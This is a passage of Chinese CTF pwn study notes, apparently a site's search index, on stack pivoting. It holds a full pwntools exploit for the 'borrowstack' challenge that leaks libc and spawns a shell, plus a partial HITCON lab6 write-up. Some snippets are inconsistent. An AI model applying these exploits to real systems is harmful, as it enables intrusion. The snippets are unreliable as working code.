\u524d\u9762\u63d0\u5230\u8fc7\uff0c\u591a\u6b21\u8fde\u7eed\u6808\u8fc1\u79fb\u9700\u8981\u63d0\u524d\u660e\u786e\u6bcf\u6b21\u6808\u7a7a\u95f4\u5730\u5740\u3002\u5c31\u597d\u50cf\u4e0a\u9762\u90a3\u9898\u76ee\uff0cstack 2 \u5730\u5740\u5728\u5199\u5165 stack 1 \u6570\u636e\u7684\u4e00\u5e76\u5199\u5165\u3002\u5176\u5b9e stack 2 \u5730\u5740\u4e5f\u53ef\u4ee5\u5728\u6267\u884c stack 1 \u7684\u65f6\u5019\u518d\u5199\u5165\u3002\u4f46\u4e00\u5b9a\u8981\u6ce8\u610f\uff1a\u6267\u884c\u7684\u547d\u4ee4\u5199\u5165\u4f4d\u7f6e\u662f\u5728 esp + 0x8 \u4f4d\u7f6e\u3002 payload_1 = ' \\0 ' * 0x90 #\u586b\u5145\u5230bank+0x90 payload_1 += ' \\0 ' * 0x8 #\u586b\u5145\uff08\u539f\u5e94\u5199\u5165ebp\uff09 payload_1 += p64 ( pop_rdi ) #\u4f20\u53c2 payload_1 += p64 ( puts_got ) #\u6cc4\u9732\u51fd\u6570 payload_1 += p64 ( puts_plt ) payload_1 += p64 ( pop_ebp ) #\u4f20\u53c2ebp payload_1 += p64 ( bank + 0x60 ) #stack 2 payload_1 += p64 ( 0x400680 ) #main\u4e2d\u7684read2&leave 32 \u4f4d\u662f\u6808\u4f20\u53c2\uff1b64 \u4f4d\u524d 6 \u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u540e\u9762\u7684\u6808\u4f20\u53c2 Link \u3002 \u603b\u7ed3 \u00b6 \u6808\u8fc1\u79fb\u53ef\u4ee5\u7528\u5728\u6808\u6ea2\u51fa\u4f46\u662f\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u6784\u5efa\u865a\u62df\u6808\u7a7a\u95f4\u3002 \u6808\u8fc1\u79fb\u901a\u8fc7\u76f4\u63a5\u76f4\u63a5\u63a7\u5236 ebp \u6765\u95f4\u63a5\u63a7\u5236 esp \uff0c\u5b9e\u73b0\u5173\u952e\u6307\u4ee4\uff08\u51fd\u6570\uff09\u4e3a leave \u6216\u5176\u4ed6\u53ef\u4ee5\u5c06 ebp \u8d4b\u503c\u7ed9 esp \u7684\u6307\u4ee4\u3002 \u6808\u8fc1\u79fb\u6784\u5efa\u7684\u865a\u62df\u6808\uff0c\u4e0d\u7b97\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u6808\uff0c\u66f4\u50cf\u662f\u6808\u7684\u987a\u5e8f\u6267\u884c\u7ed3\u6784\uff0c\u56e0\u4e3a esp \u4e0e ebp \u4e4b\u95f4\u5173\u7cfb\u53ef\u80fd\u4f1a\u5f02\u4e8e\u6b63\u5e38\u3002","title":"\u6808\u8fc1\u79fb"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_1","text":"\u524d\u9762\u521a\u603b\u7ed3\u5b8c\u7684\u7b14\u8bb0\u611f\u89c9\u4e0d\u592a\u5b8c\u5584\uff0c\u7136\u540e\u518d\u505a\u4e86\u9898\u540e\uff0c\u7406\u89e3\u66f4\u52a0\u900f\u5f7b\uff0c\u91cd\u65b0\u6574\u7406\u4e00\u4e0b\u3002","title":"\u6808\u8fc1\u79fb\uff08\u65b0\uff09"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_2","text":"\u5f53\u5b58\u5728\u6808\u6ea2\u51fa\u4e14\u53ef\u6ea2\u51fa\u957f\u5ea6\u4e0d\u8db3\u4ee5\u5bb9\u7eb3 payload \u65f6\uff0c\u53ef\u91c7\u7528\u6808\u8fc1\u79fb\u3002\u4e00\u822c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6ea2\u51fa\u4ec5\u80fd\u8986\u76d6 ebp \u3001 eip \u3002\u56e0\u4e3a\u539f\u6765\u7684\u6808\u7a7a\u95f4\u4e0d\u8db3\uff0c\u6240\u4ee5\u8981\u6784\u5efa\u4e00\u4e2a\u65b0\u7684\u6808\u7a7a\u95f4\u653e\u4e0b payload \uff0c\u56e0\u6b64\u79f0\u4e3a\u6808\u8fc1\u79fb\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_3","text":"\u9996\u5148\u6808\u6267\u884c\u547d\u4ee4\u662f\u4ece esp \u5f00\u59cb\u5411 ebp \u65b9\u5411\u9010\u6761\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u9010\u6761\u6267\u884c\u3002\u89e6\u53d1\u6808\u8fc1\u79fb\u7684\u5173\u952e\u6307\u4ee4\uff1a leave|ret \uff0c\u7b49\u6548\u4e8e mov esp ebp; pop ebp; ret; \uff0c\u4f5c\u7528\u662f\u5c06 ebp \u8d4b\u503c\u7ed9 esp \uff0c\u5e76\u5f39\u51fa ebp \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\u9000\u51fa\u6808\u65f6\uff0cesp \u6307\u5411 ebp \u6240\u5728\u4f4d\u7f6e\uff0cebp \u6307\u5411 ebp \u6240\u5b58\u50a8\u7684\u4f4d\u7f6e\u3002\u7b49\u540c\u4e8e\u6267\u884c\u4e00\u4e2a leave ret \u7684\u6548\u679c\u3002 \u6808\u8fc1\u79fb\uff1a\u901a\u8fc7\u76f4\u63a5\u63a7\u5236 ebp \u7684\u503c\uff0c\u501f\u52a9 leave \u6307\u4ee4\uff0c\u95f4\u63a5\u63a7\u5236 esp \u7684\u503c\u3002\u4ece\u4e0a\u56fe\u53ef\u89c1\uff0c\u6b63\u5e38\u9000\u51fa esp \u4f1a\u6307\u5411\u539f ebp \u4f4d\u7f6e\u3002\u5982\u679c\u6211\u4eec\u8986\u76d6 eip \u518d\u6b21\u6267\u884c leave \u6307\u4ee4\uff0cesp \u5c06\u4f1a\u6307\u5411 0x400a0 \u7684\u4f4d\u7f6e\uff08ebp \u5c06\u6307\u5411\u5f53\u524d ebp \u5b58\u50a8\u7684\u5730\u5740\uff09\uff0c\u4e5f\u5c31\u662f\u5c06\u6808\u8fc1\u79fb\u5230 0x400a0 \u3002\u901a\u8fc7\u63d0\u524d\u5e03\u7f6e ebp \u4e2d\u7684\u5730\u5740\u548c\u8c03\u7528 leave \u6307\u4ee4\uff0c\u53ef\u5b8c\u6210\u8fde\u7eed\u591a\u6b21\u6808\u8fc1\u79fb\u3002 \u5728\u4e0a\u56fe\u4e2d\u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6808\u8fc1\u79fb\u7684\u5730\u5740\u4fe1\u606f\u88ab\u63d0\u524d\u5199\u5165\uff0c\u6240\u4ee5\u660e\u786e\u5e76\u63d0\u524d\u8ba1\u7b97\u6808\u88ab\u8fc1\u79fb\u5230\u7684\u5185\u5b58\u5730\u5740\uff0c\u662f\u6808\u8fc1\u79fb\u7684\u5173\u952e\u3002\u5f53\u7136\u4e5f\u662f\u6709\u9a9a\u64cd\u4f5c\uff0c\u53ef\u4e0d\u63d0\u524d\u5199\u5165\u7684\uff0c\u8be6\u60c5\u770b\u4e0b\u9762\u9898\u76ee\u5206\u6790\u3002 \u5728\u6211\u770b\u6765\uff0c\u6808\u8fc1\u79fb\u4e0d\u80fd\u7b97\u662f\u5728\u5185\u5b58\u5730\u5740\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u6808\u7ed3\u6784\uff0c\u800c\u662f\u590d\u523b\u4e86\u6808\u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u6267\u884c\u547d\u4ee4\u7684\u529f\u80fd\u3002\u56e0\u4e3a\u4e00\u822c\u60c5\u51b5\u4e0b\u591a\u6b21\u6808\u8fc1\u79fb\uff0cebp \u5730\u5740\u4e0e esp \u5730\u5740\u5173\u7cfb\u6bd4\u8f83\u5947\u602a\uff0cebp \u5730\u5740\u4f1a\u6bd4 esp \u4f4e\uff0c\u7279\u522b\u662f\u6700\u540e\u4e00\u6b21\u6808\u8fc1\u79fb\uff0cebp \u7684\u503c\u4e0d\u518d\u91cd\u8981\uff0c\u53ef\u88ab\u6307\u5411\u5230\u5947\u5947\u602a\u602a\u7684\u5730\u5740\uff0c\u8fd9\u4e0d\u76f8\u5f53\u4e8e\u6ca1\u6709 ebp \u7684\u6808\u4e48\u3002","title":"\u5927\u6982\u539f\u7406"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_4","text":"\u9898\u76ee\u6765\u81ea i\u6625\u79cb\u65b0\u6625\u6218\u5f79 borrowstack","title":"\u9898\u76ee"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_5","text":"\u53ea\u6253\u5f00 NX \u4fdd\u62a4\u768464 \u4f4d\u7a0b\u5e8f\u3002\u7a0b\u5e8f\u5185\u5bb9\u4e3a\uff1a\u63d0\u793a\u8f93\u5165\u4e24\u6b21\u3002 ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/l, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3d3f6ef2905eff37d82ebb1bfa6e7c4e75384eff, not stripped Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 )","title":"\u9898\u76ee\u4ecb\u7ecd"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_6","text":"\u7b2c\u4e00\u5904\u63d0\u793a\u8f93\u5165\u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u6ea2\u51fa 0x10 \uff0c\u4ec5\u53ef\u4ee5\u8986\u76d6 ebp\u3001eip \u3002\u7b2c\u4e8c\u5904\u8f93\u5165\u5141\u8bb8\u5411 bank \u5199\u5165 0x100 \u5b57\u8282\uff0cbank \u4f4d\u4e8e bss \u6bb5\u5934\u3002 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char buf ; // [rsp+0h] [rbp-60h] setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); puts ( & s ); read ( 0 , & buf , 0x70uLL ); //\u53ef\u6ea2\u51fa0x10\u5b57\u8282 puts ( \"Done!You can check and use your borrow stack now!\" ); read ( 0 , & bank , 0x100uLL ); return 0 ; } \u8fd9\u6761\u9898\u76ee\u76ee\u7684\u5c31\u662f\u5f15\u5bfc\u6211\u4eec\u5c06\u6808\u8fc1\u79fb\u5230 bss \u6bb5\uff0c\u5e76\u4e14\u4e3a\u6211\u4eec\u9884\u7559\u4e86\u5199\u5165 bss \u6bb5\u7684\u51fd\u6570\u3002 \u8fd9\u91cc\u63d2\u4e00\u5634\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u9884\u7559\u51fd\u6570\uff0c\u4f46\u662f\u53ef\u4ee5\u6ea2\u51fa\u66f4\u957f\u53c8\u4e0d\u8db3\u591f\u653e\u4e0b payload\uff08\u5982\uff1a0x30\uff09\u600e\u4e48\u89e3\u51b3\uff1f\u63a7\u5236 eip \u6784\u5efa\u4e00\u4e2a\u5199\u5165\u51fd\u6570\uff0c\u7136\u540e\u624d\u518d\u8c03\u7528\u6307\u4ee4 leave \u3002\uff08\u8be5\u5957\u8def\u9898\u76ee\uff1a HITCON-Training-master lab6 \uff09","title":"\u6f0f\u6d1e"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_7","text":"\u6700\u6700\u6700\u666e\u901a\u7684\uff0c\u6ca1\u6709\u9a9a\u64cd\u4f5c\u7684\u6808\u8fc1\u79fb\u9898\u76ee\uff08\u4e5f\u5c31\u662f\u672c\u9898\uff09\uff0c\u4f1a\u8fdb\u884c\u4e24\u6b21\u6808\u8fc1\u79fb\u3002\u7b2c\u4e00\u6b21\u8fc1\u79fb\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u5e76\u4e14\u4e3a\u7b2c\u4e8c\u6b21\u6267\u884c one_gadget \u4e4b\u7c7b get shell\u3002 \u5927\u6982\u653b\u51fb\u6d41\u7a0b \u6808\u6ea2\u51fa\u63a7\u5236 ebp \u4e3a\u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u505a\u51c6\u5907\uff0c\u63a7\u5236 eip \u518d\u6b21\u6267\u884c leave \u6307\u4ee4\u3002 \u5199\u5165\u7b2c\u4e00\u6b21\u8fc1\u79fb\u7684\u6808\u6570\u636e\uff0c\u529f\u80fd\u9700\u8981\u6709\uff1a\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u4e3a\u7b2c\u4e8c\u6b21\u8fc1\u79fb\u505a\u51c6\u5907\u3002 \u7b2c\u4e8c\u6b21\u8fc1\u79fb\u7684\u6808\u6267\u884c one_gadget \u3002 \u6808\u6ea2\u51fa\u7684\u8bdd\u95ee\u9898\u4e0d\u5927\uff0c\u5728\u7b2c\u4e00\u6b21 read \u5199\u5165 0x60 \u5c31\u5230 ebp \uff0c\u7136\u540e\u6309\u9700\u8986\u76d6\u5c31\u53ef\u4ee5\u3002\u6bd4\u5982\u8bf4\u6211\u51b3\u5b9a\u5c06\u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u5230 bank+0x90 \uff0c\u90a3\u4e48 ebp \u5c31\u8986\u76d6\u4e3a bank+0x90 \u3002\u8c03\u51c6\u5730\u5740\u660e\u786e\u4e86\uff0c\u4e0b\u4e00\u6b65\u5c31\u9700\u8981\u89e6\u53d1\u6808\u8fc1\u79fb\u4e86\uff0c\u4e5f\u5c31\u662f\u5728\u6267\u884c\u4e00\u6b21 leave \u6307\u4ee4\uff0c\u901a\u8fc7\u8986\u5199 eip \u4e3a leave \u3002(bank\u5730\u5740\u4e3a0x601080 \uff0c leave\u5730\u5740\u4e3a0x400699) payload_0 = 'a' * 0x60 payload_0 += bank + 0x90 payload_0 += leave \u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u5916\u90e8\u51c6\u5907\u5b8c\u6210\uff0c\u5c31\u9700\u8981\u5411 bank+0x90 \u5199\u5165\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002\u8fd9\u9053\u9898\u662f\u5229\u7528\u7684\u662f\u7b2c\u4e8c\u6b21 read \u8f93\u5165 stack 1 \u6570\u636e\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u9700\u8981\u8fdb\u884c\u4e24\u6b21\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8f93\u5165 stack 1 \u6570\u636e\u8981\u8003\u8651\u7b2c\u4e8c\u6b21\u6808\u8fc1\u79fb\u7684\u5730\u5740\uff0c\u6211\u9009\u62e9 bank+0x60 \u3002 \u5728 stack 1 \u9700\u8981\u6cc4\u9732\u51fa libc \u57fa\u5730\u5740\uff0c\u5199\u5165stack 2 \u6570\u636e\u3002\u6cc4\u9732\u5730\u5740\u5c31\u9009\u62e9\u4e00\u4e2a\u51fd\u6570\u771f\u5b9e\u5730\u5740\u8f93\u51fa\u5e76\u8ba1\u7b97\u504f\u79fb\uff0c\u7136\u540e\u8c03\u7528 main \u51fd\u6570\u4e2d\u7684 read2 \u5199\u5165 stack 2 \uff0c\u56e0\u4e3a\u987a\u5e8f\u6267\u884c\uff0c\u56e0\u6b64\u8fd8\u6267\u884c\u4e86\u4e00\u6b21 leave \uff08\u5373 main \u51fd\u6570\u4ece read2 \u5f00\u59cb\u8fd0\u884c\u4e00\u904d\uff09\uff0c\u89e6\u53d1\u7b2c\u4e8c\u6b21\u6808\u8fc1\u79fb\u3002 payload_1 = ' \\0 ' * 0x90 #\u586b\u5145\u5230bank+0x90 payload_1 += p64 ( bank + 0x60 ) #stack2\u5730\u5740 payload_1 += p64 ( pop_rdi ) #\u4f20\u53c2 payload_1 += p64 ( puts_got ) #\u6cc4\u9732\u51fd\u6570 payload_1 += p64 ( puts_plt ) payload_1 += p64 ( 0x400680 ) #main\u4e2d\u7684read2&leave stack 1 \u51c6\u5907\u5b8c\u6210\uff0c\u5e76\u4e14\u4e3a stack 2 \u9884\u7559\u5199\u5165\u51fd\u6570\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5904\u7406\u5e76\u5199\u5165 stack 2 \u3002\u56e0\u4e3a\u8fd9\u4e2a\u6808\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2a\u6808\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u5173\u5fc3 ebp \u7684\u503c\uff0c\u6211\u7ed9\u5b83\u8d4b\u503c 0xdeadbeef \u3002 \u5982\u679c\u9047\u5230\u6709\u7684\u9898\u76ee\u9700\u89813 \u6b21\u3001 4 \u6b21\u7b49\u591a\u6b21\u8fc1\u79fb\uff0c\u5c31\u5c06 ebp \u8d4b\u503c\u4e3a\u4e0b\u4e00\u6b21\u8fc1\u79fb\u7684\u5730\u5740\uff0c\u76f4\u5230\u6700\u540e\u4e00\u6b21\u3002 libc_base = u64 ( p . recv ( 6 )[:] . ljust ( 8 , ' \\0 ' )) - libc . symbols [ 'puts' ] #\u6cc4\u9732libc\u57fa\u5730\u5740 payload = 'a' * 0x60 #\u586b\u5145\u5230bank+0x60 payload_2 += p64 ( 0xdeadbeef ) #ebp\u503c payload += p64 ( one_gadget + libc_base ) #one_gadget p . sendline ( pay ) p . interactive () \u586b\u5145\u8df3\u8f6c\u793a\u610f\u56fe\uff1a \u5b8c\u6574 exp from pwn import * context . log_level = 'debug' p = process ( \"./borrowstack\" ) elf = ELF ( \"./borrowstack\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) bank = 0x601080 pop_rdi = 0x400703 leave = 0x400699 puts_plt = elf . plt [ 'puts' ] puts_got = elf . got [ 'puts' ] one_gadget = 0xf02a4 payload_0 = 'a' * 0x60 payload_0 += p64 ( bank + 0x90 ) + p64 ( leave ) p . recvuntil ( 'want' ) p . send ( payload_0 ) payload_1 = ' \\0 ' * 0x90 + p64 ( bank + 0x60 ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload_1 += p64 ( 0x0400680 ) p . sendafter ( 'now! \\n ' , payload_1 ) libc_base = u64 ( p . recv ( 6 )[:] . ljust ( 8 , ' \\0 ' )) - libc . symbols [ 'puts' ] info ( \"one:\" + hex ( libc_base + one_gadget )) payload_2 = 'a' * 0x60 + p64 ( 0xdeadbeef ) + p64 ( one_gadget + libc_base ) p . sendline ( payload_2 ) p . interactive () \u524d\u9762\u63d0\u5230\u8fc7\uff0c\u591a\u6b21\u8fde\u7eed\u6808\u8fc1\u79fb\u9700\u8981\u63d0\u524d\u660e\u786e\u6bcf\u6b21\u6808\u7a7a\u95f4\u5730\u5740\u3002\u5c31\u597d\u50cf\u4e0a\u9762\u90a3\u9898\u76ee\uff0cstack 2 \u5730\u5740\u5728\u5199\u5165 stack 1 \u6570\u636e\u7684\u4e00\u5e76\u5199\u5165\u3002\u5176\u5b9e stack 2 \u5730\u5740\u4e5f\u53ef\u4ee5\u5728\u6267\u884c stack 1 \u7684\u65f6\u5019\u518d\u5199\u5165\u3002\u4f46\u4e00\u5b9a\u8981\u6ce8\u610f\uff1a\u6267\u884c\u7684\u547d\u4ee4\u5199\u5165\u4f4d\u7f6e\u662f\u5728 esp + 0x8 \u4f4d\u7f6e\u3002 payload_1 = ' \\0 ' * 0x90 #\u586b\u5145\u5230bank+0x90 payload_1 += ' \\0 ' * 0x8 #\u586b\u5145\uff08\u539f\u5e94\u5199\u5165ebp\uff09 payload_1 += p64 ( pop_rdi ) #\u4f20\u53c2 payload_1 += p64 ( puts_got ) #\u6cc4\u9732\u51fd\u6570 payload_1 += p64 ( puts_plt ) payload_1 += p64 ( pop_ebp ) #\u4f20\u53c2ebp payload_1 += p64 ( bank + 0x60 ) #stack 2 payload_1 += p64 ( 0x400680 ) #main\u4e2d\u7684read2&leave 32 \u4f4d\u662f\u6808\u4f20\u53c2\uff1b64 \u4f4d\u524d 6 \u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u540e\u9762\u7684\u6808\u4f20\u53c2 Link \u3002","title":"\u5229\u7528"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/#_8","text":"\u6808\u8fc1\u79fb\u53ef\u4ee5\u7528\u5728\u6808\u6ea2\u51fa\u4f46\u662f\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u6784\u5efa\u865a\u62df\u6808\u7a7a\u95f4\u3002 \u6808\u8fc1\u79fb\u901a\u8fc7\u76f4\u63a5\u76f4\u63a5\u63a7\u5236 ebp \u6765\u95f4\u63a5\u63a7\u5236 esp \uff0c\u5b9e\u73b0\u5173\u952e\u6307\u4ee4\uff08\u51fd\u6570\uff09\u4e3a leave \u6216\u5176\u4ed6\u53ef\u4ee5\u5c06 ebp \u8d4b\u503c\u7ed9 esp \u7684\u6307\u4ee4\u3002 \u6808\u8fc1\u79fb\u6784\u5efa\u7684\u865a\u62df\u6808\uff0c\u4e0d\u7b97\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u6808\uff0c\u66f4\u50cf\u662f\u6808\u7684\u987a\u5e8f\u6267\u884c\u7ed3\u6784\uff0c\u56e0\u4e3a esp \u4e0e ebp \u4e4b\u95f4\u5173\u7cfb\u53ef\u80fd\u4f1a\u5f02\u4e8e\u6b63\u5e38\u3002","title":"\u603b\u7ed3"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB_O/","text":"\u6808\u8fc1\u79fb\u5b66\u4e60\u9644\u4f8b\u9898 \u00b6 \u4ecb\u7ecd \u00b6 \u6808\u8fc1\u79fb\u53ef\u4ee5\u89e3\u51b3\u6808\u6ea2\u51fa\u540e\uff0c\u6ca1\u6709\u8db3\u591f\u7a7a\u95f4\u5199\u5165 payload \u7684\u60c5\u51b5\u3002\u4e3b\u8981\u901a\u8fc7 \u4f2a\u9020 ebp \uff0c\u5e76\u5229\u7528 leave|ret gadget \u52ab\u6301\u6808\u5230\u9884\u8bbe\u4f4d\u7f6e\u3002 leave | ret == mov ebp,esp;pop ebp;ret HITCON-Training-master lab6 \u00b6 \u9898\u76ee\u4ecb\u7ecd \u00b6 \u7a0b\u5e8f\u4e3a32 \u4f4d\u6253\u5f00 NX \u9632\u62a4\uff1a \u8fd0\u884c\u7a0b\u5e8f\uff0c\u63d0\u793a\u8f93\u5165\uff0c\u8f93\u5165\u540e\u9000\u51fa\u7a0b\u5e8f\uff1a main \u51fd\u6570 read \u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u53ef\u6ea2\u51fa\u957f\u5ea6\u4e3a 0x40 - 0x28 \uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char buf ; // [ esp + 0 h ] [ ebp - 28 h ] if ( count != 0x539 ) exit ( 1 ); ++ count ; setvbuf ( _bss_start , 0 , 2 , 0 ); puts ( \"Try your best :\" ); return read ( 0 , & buf , 0x40 u ); // \u6808\u6ea2\u51fa } \u5728\u53ef\u4ee5\u6ea2\u51fa\u64cd\u4f5c\u7684\u7a7a\u95f4\u5f88\u5c0f\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u6808\u8fc1\u79fb\uff0c\u5f53\u7136\u4f60\u80fd\u627e\u5230\u8d85\u77ed\u7684 shellcode \u4e5f\u53ef\u4ee5\u3002\u80fd\u4e0d\u80fd\u8fdb\u884c ROP \uff0cemmm \u9700\u8981\u4fee\u6539 count \u9632\u6b62\u9000\u51fa\u7a0b\u5e8f\u3002\u90a3\u5c31\u7528\u6808\u8fc1\u79fb\u5427\u3002 \u5229\u7528\u601d\u8def \u00b6 \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa eip \u8c03\u7528 read \u5728\u52ab\u6301\u524d\uff0c\u5199\u5165\u4f2a\u9020\u6808\u7a7a\u95f4\u5185\u5bb9\uff08\u6267\u884c\u4ec0\u4e48\u547d\u4ee4\u3001\u6709\u4ec0\u4e48\u53d8\u91cf\u3001\u4f2a\u9020\u6808\u7684ebp\u7b49\uff09 \u4f2a\u9020 ebp \u52ab\u6301\u5f53\u524d\u6808\u5230\u53e6\u5916\u4e00\u4e2a\u5730\u65b9 stack 1 \uff1b\u7136\u540e\u5728 stack 1 \u6cc4\u9732\u51fa libc \u57fa\u5730\u5740\uff0c\u5e76\u518d\u6b21\u4f2a\u9020 ebp \u52ab\u6301\u5f53\u524d\u6808\u5230\u53e6\u5916\u4e00\u4e2a\u5730\u65b9 stack 2\uff1b\u8c03\u7528 system('/bin/sh') \u3002 \u7b2c\u4e00\u6b65 \u6211\u9009\u62e9\u5c06\u5f53\u524d\u6808 stack 0 \uff0c\u52ab\u6301\u5230\u5185\u5b58\u5730\u5740\u4e3a bss+0x200 \u7684stack 1\u3002\u4e3a\u4ec0\u4e48\u662f bss+0x200 \uff1f\u4e00\u5f00\u59cb\u52ab\u6301\u5230 bss \u62a5\u9519\uff0c\u7136\u540e\u5c31\u9009\u62e9\u9ad8\u70b9\u7684\u5730\u5740\u5c31\u6210\u529f\u4e86\u3002 \u6211\u4eec\u8fc1\u79fb\u6808\u4e4b\u540e\uff0c\u6808\u603b\u4e0d\u80fd\u662f\u7a7a\u7684\uff0c\u4ec0\u4e48\u90fd\u4e0d\u6267\u884c\u5c31\u9000\u51fa\u4e86\uff0c\u6240\u4ee5\u5728\u8fd9\u4e00\u6b65\u9700\u8981\u63a7\u5236 stack 0 \u7684 eip \u8c03\u7528 read \uff0c\u5199\u5165 stack 1 \u7684\u6808\u6570\u636e\u3002 \u5927\u81f4\u5229\u7528\u601d\u8def\u91cc\u8bf4\u4e86\uff0c\u9700\u8981\u7b2c\u4e8c\u6b21\u8fc1\u79fb\u6808\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u9700\u8981\u4f2a\u9020 stack 1 \uff0c\u4ee5\u5b9e\u73b0\u5728\u5c06 stack 1 \u52ab\u6301\u5230 stack 2 \u3002 payload 0 \u6784\u9020\u5982\u4e0b\uff1a payload = 'a' * 0x28 #\u586b\u5145 payload += stack_1 #\u4f2a\u9020ebp payload += read_plt #\u8c03\u7528read payload += leave_ret #\u5229\u7528gadget\u5c06ebp\u8d4b\u503cesp\u5b8c\u6210\u6808\u8fc1\u79fb payload += p32 ( 0 ) + p32 ( stack_1 ) + p32 ( 0x100 ) #read\u4f20\u53c2 \u6ce8\u610f\uff1a\u8f93\u5165 payload 0 \u4f9d\u7136\u5728 stack 0 \uff0c\u505c\u5728 read \u7b49\u5f85\u8f93\u5165\u72b6\u6001\u3002\u6211\u4eec\u8f93\u5165 payload 1 \u540e\u624d\u6808\u8fc1\u79fb\u5230 stack 1 \u3002 \u7b2c\u4e8c\u6b65 \u5728\u8fd9\u4e00\u6b65\u9700\u8981\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u8c03\u7528\u4e00\u4e2a\u6709\u8f93\u51fa\u529f\u80fd\u7684\u51fd\u6570\uff0c\u628a\u67d0\u4e00\u4e2a\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\u8f93\u51fa\u51fa\u6765\uff0c\u7136\u540e\u8ba1\u7b97 libc \u7684\u504f\u79fb\u3002 \u8fd9\u4e00\u6b65\u8fd8\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u6808\u8fc1\u79fb\uff0c\u4f2a\u9020\u7684 ebp \u5df2\u7ecf\u5728\u8fc1\u79fb\u8fdb\u5165 stack 1 \u524d\uff0c\u5df2\u7ecf\u5728stack 0 \u901a\u8fc7 read \u5199\u5165\u5230 stack 1 \u7684 ebp \u4f4d\u7f6e\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8c03\u7528 leave|ret gadget \u5c31\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u3002 \u65e2\u7136\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u5c31\u8fd8\u662f\u9700\u8981\u63d0\u524d\u5199\u5165 stack 3 \u7684\u6570\u636e\uff0c\u5c31\u9700\u8981\u518d\u6b21\u8c03\u7528 read \u3002payload 1 \u5148\u63d0\u4f9b\u4e00\u4e2a\u7528\u4e8e\u5199\u5165stack 2 \u7684 read \u51fd\u6570\u5165\u53e3\uff0c\u81f3\u4e8e payload 2 \u5728\u7b2c\u4e09\u6b65\u5206\u6790\u3002 payload 1 \u6784\u9020\u5982\u4e0b\uff1a payload = p32 ( stack_2 ) #\u4f2a\u9020ebp payload += p32 ( puts_plt ) #\u8c03\u7528\u8f93\u51fa\u51fd\u6570 payload += p32 ( pop_ret ) #\u8fd4\u56de payload += p32 ( puts_got ) #\u51fd\u6570\u771f\u5b9e\u5730\u5740 payload += p32 ( read_plt ) payload += p32 ( leave_ret ) #\u5229\u7528gadget\u5c06ebp\u8d4b\u503cesp\u5b8c\u6210\u6808\u8fc1\u79fb payload += p32 ( 0 ) + p32 ( stack_2 ) + p32 ( 0x100 ) #read\u4f20\u53c2 \u7b2c\u4e09\u6b65 